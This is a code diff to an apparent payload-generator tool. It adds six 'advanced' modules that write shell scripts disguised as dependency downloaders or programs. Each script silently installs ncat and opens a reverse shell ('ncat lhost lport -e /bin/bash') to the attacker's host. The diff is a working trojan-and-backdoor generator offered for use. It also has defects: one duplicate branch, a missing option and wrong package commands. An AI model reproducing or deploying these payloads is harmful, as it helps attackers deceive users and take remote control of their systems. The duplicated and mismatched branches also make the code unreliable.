@@ -47,6 +47,15 @@ print("""Available payload modules>>>
 
 [L] febrev-listener
 
+Advanced payload modules>>>>
+
+[11] linux_debian/fake_downloading_reverse_tcp
+[12] linux_arch/fake_downloading/reverse_tcp
+[13] linux_termux/fake_downloading/reverse_tcp
+[14] linux_debian/fake_program/reverse_tcp
+[15] linux_arch/fake_program/reverse_tcp
+[16] linux_termux/fake_program/reverse_tcp
+
 """)
 payload=input("frsf(choose payload)#> ")
 if payload=="1":
@@ -181,6 +190,73 @@ os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 	f=open(f"{output}/{name}.py","w+")
 	f.write(pyload)
 	f.close()
+	
+elif payload=="11":
+	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
+	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	with open(f"{output}/{name}.sh","w+") as f:
+		s=(f"""sudo apt-get install nmap -y &> /dev/null
+echo -e '\033[1;32m DOWNLOADING dependencies for {name} ..please wait!\n'
+sudo apt-get install ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		""")
+		f.write(s)
+		os.system(f"chmod +x {output}/{name}.sh ")
+elif payload=="12":
+	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
+	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	with open(f"{output}/{name}.sh","w+") as f:
+		s=(f"""sudo pacman -S install nmap -y &> /dev/null
+echo -e '\033[1;32m DOWNLOADING dependencies for {name} ..please wait!\n'
+sudo pacman -S install ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		""")
+		f.write(s)
+		os.system(f"chmod +x {output}/{name}.sh ")
+elif payload=="13":
+	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
+	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	with open(f"{output}/{name}.sh","w+") as f:
+		s=(f"""sudo apt-get install nmap -y &> /dev/null
+echo -e '\033[1;32m DOWNLOADING dependencies for {name} ..please wait!\n'
+sudo apt-get install ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		""")
+		f.write(s)
+		os.system(f"chmod +x {output}/{name}.sh ")
+elif payload=="14":
+	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
+	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	with open(f"{output}/{name}.sh","w+") as f:
+		s=(f"""sudo apt-get install nmap -y &> /dev/null
+echo -e '\033[1;32m {name} is executing,this may take a while ..please wait!\n'
+sudo apt-get install ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		""")
+		f.write(s)
+		os.system(f"chmod +x {output}/{name}.sh ")
+elif payload=="15":
+	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
+	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	with open(f"{output}/{name}.sh","w+") as f:
+		s=(f"""sudo pacman -S install nmap -y &> /dev/null
+echo -e '\033[1;32m {name} is executing,this may take a while ..please wait!\n'
+sudo apt-get install ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		""")
+		f.write(s)
+		os.system(f"chmod +x {output}/{name}.sh ")
+elif payload=="14":
+	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
+	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	with open(f"{output}/{name}.sh","w+") as f:
+		s=(f"""sudo apt-get install nmap -y &> /dev/null
+echo -e '\033[1;32m {name} is executing,this may take a while ..please wait!\n'
+sudo apt-get install ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		""")
+		f.write(s)
+		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="L":
 	print("""
 ███████╗██████╗ 
